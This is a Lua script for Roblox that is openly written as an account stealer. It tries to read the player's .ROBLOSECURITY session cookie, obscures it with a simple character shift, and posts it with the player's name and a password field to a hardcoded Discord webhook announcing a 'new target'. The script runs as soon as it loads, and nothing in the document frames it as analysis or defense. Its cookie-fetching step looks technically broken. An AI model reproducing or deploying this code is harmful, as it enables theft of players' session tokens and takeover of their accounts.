local function fetchCookies()
    local cookies = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync("https://auth.roblox.com/v2/logout"))
    for _, cookie in ipairs(cookies) do
        if cookie.Name == ".ROBLOSECURITY" then
            return cookie.Value
        end
    end
    return nil
end

local function encodeString(str)
    local encoded = ""
    for i = 1, #str do
        encoded = encoded .. string.char(string.byte(str, i) + 2)
    end
    return encoded
end

local function decodeString(str)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) - 2)
    end
    return decoded
end

local function sendData()
    local playerName = game.Players.LocalPlayer.Name
    local playerPass = "password" -- Implement password capture if needed
    local securityCookie = fetchCookies()

    if not securityCookie then
        warn("Cookie retrieval failed!")
        return
    end

    local discordHook = "https://discord.com/api/webhooks/1395475931858210867/lfb0vDAyIFC7CGnE9tZq8D3-1Be2qAJiPw4HkdBmXmDwEqxo7WWJmyH25MGadNYIOUSA"
    local payload = {
        content = "@everyone New target acquired!",
        embeds = {
            {
                title = "Roblox Data Extract",
                fields = {
                    { name = "Player Name", value = encodeString(playerName), inline = true },
                    { name = "Player Password", value = encodeString(playerPass), inline = true },
                    { name = "Security Cookie", value = encodeString(securityCookie), inline = false }
                }
            }
        }
    }

    local status, result = pcall(function()
        game:GetService("HttpService"):PostAsync(discordHook, game:GetService("HttpService"):JSONEncode(payload))
    end)

    if status then
        print("Data transmission successful!")
    else
        warn("Data transmission failed: " .. tostring(result))
    end
end

sendData()
